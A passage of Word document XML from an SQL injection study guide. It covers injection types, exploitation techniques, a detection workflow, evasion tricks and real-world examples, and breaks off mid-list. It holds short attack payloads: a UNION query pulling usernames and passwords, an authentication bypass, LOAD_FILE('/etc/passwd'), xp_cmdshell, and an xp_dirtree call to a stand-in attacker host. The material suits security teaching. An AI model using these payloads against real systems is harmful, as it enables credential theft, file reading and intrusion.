        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- In-band </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Error-based, Union-based)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Blind </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Boolean-based, Time-based)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Out-of-band </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (OAST)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Second-order </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0DAB6B5E" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>B) By Exploitation Context:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Injection in SELECT, INSERT, UPDATE, DELETE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- ORDER BY clause injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0442A329" w14:textId="1BE1215D" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00423E65">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="146" w:name="_Toc208408617"/>
      <w:r>
        <w:t>Core Exploitation Techniques</w:t>
      </w:r>
      <w:bookmarkEnd w:id="146"/>
    </w:p>
    <w:p w14:paraId="389439CE" w14:textId="77777777" w:rsidR="0098113E" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:t>Union-based SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36907D87" w14:textId="77777777" w:rsidR="0098113E" w:rsidRPr="0098113E" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="0098113E">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Uses the UNION operator to combine results of a malicious SELECT with a legitimate query.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0781578D" w14:textId="77777777" w:rsidR="00DE7D51" w:rsidRPr="00DE7D51" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="0098113E">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A47D42" w14:textId="77777777" w:rsidR="00DE7D51" w:rsidRPr="00DE7D51" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="0098113E">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Find Column Count using ORDER BY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7E11F6" w14:textId="77777777" w:rsidR="00DE7D51" w:rsidRPr="00DE7D51" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="0098113E">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Find Visible Columns with UNION SELECT NULL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E981F9" w14:textId="77777777" w:rsidR="00DE7D51" w:rsidRPr="00DE7D51" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="0098113E">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Extract Data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A54A7ED" w14:textId="173E23A0" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE7D51">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE7D51">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>' UNION SELECT username, password, NULL FROM users--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40EE68B3" w14:textId="77777777" w:rsidR="003A4855" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:t>Error-based SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B4C319" w14:textId="77777777" w:rsidR="003A4855" w:rsidRPr="003A4855" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="003A4855">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Leverages verbose database errors to leak schema or data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7E7CF5" w14:textId="745BE032" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="003A4855">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Example: ' AND 1=CONVERT(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A4855">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003A4855">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, (SELECT @@version))--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED42B9C" w14:textId="77777777" w:rsidR="00492280" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Boolean-based Blind </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="17A95C15" w14:textId="77777777" w:rsidR="00492280" w:rsidRPr="00492280" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00492280">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Infers true/false conditions via page behavior.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFBF304" w14:textId="4285876E" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00492280">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Example: ' AND 1=1-- vs ' AND 1=2--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149499F2" w14:textId="77777777" w:rsidR="00D865EE" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Time-based Blind </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6F1CD0EB" w14:textId="77777777" w:rsidR="00D865EE" w:rsidRPr="00D865EE" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00D865EE">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Uses delays like SLEEP() to infer conditions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7748AC4C" w14:textId="45086BCF" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00D865EE">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Example: ' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E7A9A2" w14:textId="77777777" w:rsidR="00190476" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Out-of-Band </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="523FD4AC" w14:textId="77777777" w:rsidR="00190476" w:rsidRPr="00190476" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00190476">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Uses functions that trigger external requests (DNS/HTTP).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318EE54C" w14:textId="0FDDFD01" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00190476">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Example (MSSQL): '; exec master..</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00190476">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xp_dirtree</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00190476">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> '//attacker.com/test'--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EEFF0F" w14:textId="77777777" w:rsidR="00190476" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Second-Order </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5AD90058" w14:textId="77777777" w:rsidR="00190476" w:rsidRPr="00190476" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00190476">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Payload is stored safely but later executed when reused unsafely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9EEA90" w14:textId="5F084201" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r w:rsidRPr="00190476">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Example: malicious profile data injected, executed in later queries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41996C2E" w14:textId="6337B862" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="005A5784">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="147" w:name="_Toc208408618"/>
      <w:r>
        <w:t>Detection Workflow</w:t>
      </w:r>
      <w:bookmarkEnd w:id="147"/>
    </w:p>
    <w:p w14:paraId="09736A40" w14:textId="77777777" w:rsidR="001424BC" w:rsidRPr="001424BC" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Identify Inputs: forms, cookies, headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D71DC90" w14:textId="77777777" w:rsidR="001424BC" w:rsidRPr="001424BC" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Inject test payloads: ', --, OR 1=1, UNION SELECT NULL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A8C058" w14:textId="77777777" w:rsidR="001424BC" w:rsidRPr="001424BC" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Analyze</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> responses: errors, anomalies, delays</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0779BD9A" w14:textId="77777777" w:rsidR="001424BC" w:rsidRPr="001424BC" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Escalate with Boolean, UNION, Error, Time/OAST tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D800B2" w14:textId="176E8F3C" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Confirm severity and access level.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9F7A4A" w14:textId="06C86B0F" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00D279D4">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="148" w:name="_Toc208408619"/>
      <w:r>
        <w:t>Obfuscation &amp; Evasion Tricks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="148"/>
    </w:p>
    <w:p w14:paraId="1323499E" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Encoding (%27 for '), Hex (0x61646d696e for admin), Char functions, Concatenation, Comments (--, #, /* */), Case manipulation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCBF8FB" w14:textId="7685F637" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="00A71108">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="149" w:name="_Toc208408620"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Real-World </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Examples</w:t>
      </w:r>
      <w:bookmarkEnd w:id="149"/>
    </w:p>
    <w:p w14:paraId="6B1B9311" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>- Authentication bypass: ' OR '1'='1 --</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Data exfiltration via UNION</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Privilege escalation in UPDATE/INSERT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- File access in MySQL: LOAD_FILE('/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- OS command execution in MSSQL: EXEC </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xp_cmdshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
